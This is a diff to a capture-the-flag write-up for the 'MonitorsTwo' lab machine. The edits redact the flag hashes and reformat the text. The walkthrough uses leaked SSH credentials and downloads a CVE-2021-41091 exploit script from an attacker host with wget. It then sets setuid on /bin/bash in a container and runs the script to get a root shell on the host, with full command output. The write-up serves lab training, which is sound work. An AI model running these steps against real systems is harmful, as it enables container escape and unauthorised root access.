@@ -213,7 +213,7 @@ Since we got some creds, `marcus:funkymonkey`, we can try to SSH into our target
 ```bash
 ssh marcus@10.10.11.211
 marcus@monitorstwo:~$ cat user.txt
-b73a92d1083186bec3d9d742ccdfa880
+<SNIP>
 ```
 
 ## Privilege escalation (2)
@@ -274,8 +274,8 @@ Docker's version is `20.10.5`, thus, we should be able to exploit this vulnerabi
 So what we need to is:
 1. Repeat our initial foothold process by using CVE-2022-46169 to gain RCE and privesc via the `capsh` binary.
 2. Issue the appropriate permissions to the `bash` binary with the `chmod u+s /bin/bash` command.
-3. Clone CVE-2021-41091's PoC on our attack host and transfer the bash script (`exp.sh`) on the target using `marcus` account via the SSH.
-4. Execute `exp.sh` using the `marcus` user.
+3. Clone CVE-2021-41091's PoC on our attack host, transfer the bash script (`exp.sh`) on the target using `marcus` account via the SSH, and execute it using the `marcus` user.
+
 
 1. Repeat our foothold and gain root within the container:
 
@@ -317,55 +317,55 @@ So what we need to is:
 
 3. From `marcus`'s terminal:
 
-```bash
-# download the script
-marcus@monitorstwo:~$ wget http://10.10.14.33:8000/exp.sh
---2024-01-25 18:19:47--  http://10.10.14.33:8000/exp.sh
-Connecting to 10.10.14.33:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 2446 (2.4K) [text/x-sh]
-Saving to: ‘exp.sh’
+  ```bash
+  # download the script
+  marcus@monitorstwo:~$ wget http://10.10.14.33:8000/exp.sh
+  --2024-01-25 18:19:47--  http://10.10.14.33:8000/exp.sh
+  Connecting to 10.10.14.33:8000... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 2446 (2.4K) [text/x-sh]
+  Saving to: ‘exp.sh’
 
-exp.sh                100%[========================>]   2.39K  --.-KB/s    in 0s
+  exp.sh                100%[========================>]   2.39K  --.-KB/s    in 0s
 
-2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446]
-# assign execute permissions
-marcus@monitorstwo:~$ chmod +x exp.sh
-# confirm permissions
-marcus@monitorstwo:~$ ls -l exp.sh
-total 8
--rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh
-# execute the script
-marcus@monitorstwo:~$ ./exp.sh
-[!] Vulnerable to CVE-2021-41091
-[!] Now connect to your Docker container that is accessible and obtain root access !
-[>] After gaining root access execute this command (chmod u+s /bin/bash)
+  2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446]
+  # assign execute permissions
+  marcus@monitorstwo:~$ chmod +x exp.sh
+  # confirm permissions
+  marcus@monitorstwo:~$ ls -l exp.sh
+  total 8
+  -rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh
+  # execute the script
+  marcus@monitorstwo:~$ ./exp.sh
+  [!] Vulnerable to CVE-2021-41091
+  [!] Now connect to your Docker container that is accessible and obtain root access !
+  [>] After gaining root access execute this command (chmod u+s /bin/bash)
 
-Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
-[!] Available Overlay2 Filesystems:
-/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
-/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+  Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
+  [!] Available Overlay2 Filesystems:
+  /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+  /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
 
-[!] Iterating over the available Overlay2 filesystems !
-[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
-[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'
+  [!] Iterating over the available Overlay2 filesystems !
+  [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+  [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'
 
-[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
-[!] Rooted !
-[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
-[?] If it didnt spawn a shell go to this path and execute './bin/bash -p'
+  [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+  [!] Rooted !
+  [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+  [?] If it didnt spawn a shell go to this path and execute './bin/bash -p'
 
-[!] Spawning Shell
-bash-5.1# exit
+  [!] Spawning Shell
+  bash-5.1# exit
 
-# change to the above mentioned 'Current Vulnerable Path'
-marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
-# execute the command './bin/bash -p'
-marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
-bash-5.1# id
-uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
-bash-5.1# cat /root/root.txt
-59b6acb513fbdc3f19c588bf995c0ca4
-```
+  # change to the above mentioned 'Current Vulnerable Path'
+  marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+  # execute the command './bin/bash -p'
+  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
+  bash-5.1# id
+  uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
+  bash-5.1# cat /root/root.txt
+  <SNIP>
+  ```
 
 ![](machine_pwned.png){: width="75%" .normal}
